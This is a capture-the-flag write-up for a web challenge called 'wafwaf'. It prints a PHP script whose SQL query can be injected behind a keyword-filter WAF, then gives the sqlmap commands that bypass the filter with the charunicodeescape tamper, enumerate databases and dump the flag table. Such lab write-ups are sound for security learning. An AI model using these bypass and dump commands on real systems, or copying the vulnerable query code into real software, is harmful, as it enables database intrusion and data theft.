# wafwaf

## Keynotes

* sqlmap POST request with payload
* sqlmap with tamper and technique
* custom waf bypassing

## Tracking

1. Opened the URL and found a PHP script which appears to respond to POST requests, even though I was not sure that this was actually the script that can be reached by calling that endpoint

```php
<?php error_reporting(0);
require 'config.php';

class db extends Connection {
    public function waf($s) {
        if (preg_match_all('/'. 
	        	implode('|', array(
	            '[' . preg_quote("(*<=>|'&-@") . ']',
	            'select', 'and', 'or', 'if', 'by', 'from', 
	            'where', 'as', 'is', 'in', 'not', 'having'
	        	))
        	 . '/i', $s, $matches)) die(var_dump($matches[0]));
        return json_decode($s);
    }

    public function query($sql) {
        $args = func_get_args();
        unset($args[0]);
        return parent::query(vsprintf($sql, $args));
    }
}

$db = new db();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $obj = $db->waf(file_get_contents('php://input'));
    $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
} else {
    die(highlight_file(FILE, 1));
}
?>
```

2. Executed nmap & dirb, but couldn't find anything else

3. Started looking into the code and understood how it works - I have to find a way to bypass the waf filter to be able to inject my payload into the sql query which is vulnerable

4. Observed that the payload should, actually, be in a JSON format and the field that will be used for injection should be placed under the "user" attribute

5. Created a request file for sqlmap and ran it with the command "sqlmap -r input", but nothing was found 😞

```
POST / HTTP/1.1
Host: 178.128.35.180:30023

{
	"user":"test"
}
```

6. Started looking at hints and read something about built-in tampers in sqlmap - after many more hints and tries, I settled for the **charunicodeescape** temper - and the injection worked using a time based blind attack and identified the dbms as mysql

```
sqlmap -r input --tamper=charunicodeescape
```

7. Learned more about charunicodeescape by looking at its [source code](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py)

8. Observing the type of attack, I thought about optimizing the command a little bit while starting to map the database structure, because the time based attacks are slow by definition (post-solving: yep, it took a while to execute all the commands)

```
sqlmap -r input --tamper=charunicodeescape --dbms=mysql --technique=T --dbs
```

9. Running the previous query returned 5 databases: information_schema, db_m8452, performance_schema, sys, my_sql

10. Started running queries on the only database that sticks out: db_m8452, and obtained 2 tables: definitely_not_a_flag, notes

```
sqlmap -r input --tamper=charunicodeescape --dbms=mysql --technique=T -D db_m8452 --tables
```

11. Started looking in the table that sticks out the most and obtained the flag:

```
sqlmap -r input --tamper=charunicodeescape --dbms=mysql --technique=T -D db_m8452 -T definitely_not_a_flag --dump
```